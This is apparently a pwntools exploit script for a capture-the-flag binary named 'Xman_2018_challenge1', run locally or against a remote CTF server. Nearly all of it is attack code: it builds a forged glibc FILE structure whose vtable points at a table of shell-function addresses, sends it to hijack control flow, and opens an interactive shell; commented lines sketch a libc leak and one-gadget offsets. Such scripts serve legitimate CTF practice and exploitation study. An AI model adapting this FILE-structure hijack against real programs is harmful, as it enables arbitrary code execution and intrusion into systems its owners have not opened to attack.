import sys
from pwn import *
from ctypes import *
from FILE import *
from pwn_debug.pwn_debug import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./Xman_2018_challenge1')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./Xman_2018_challenge1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',29172)
			elf=ELF('./Xman_2018_challenge1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		

		shell=0x400897
		pay='a'*0xff
		io.recv()
		io.sendline('1')
		pay=p64(0xfbad2488)+p64(0)*12+p64(0x6010c0)
		pay+=p64(3)+p64(0)*2+p64(0x6011a0)
		pay+=p64(0xffffffffffffffff)+p64(0)+p64(0x6010b0)+p64(0)*6+p64(0x6011c0)
		pay=pay.ljust(0x100,'\x00')+p64(0x6010c0)+p64(shell)*0x20
		io.sendline(pay)
		io.recv()
		# io.sendline('2')
		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue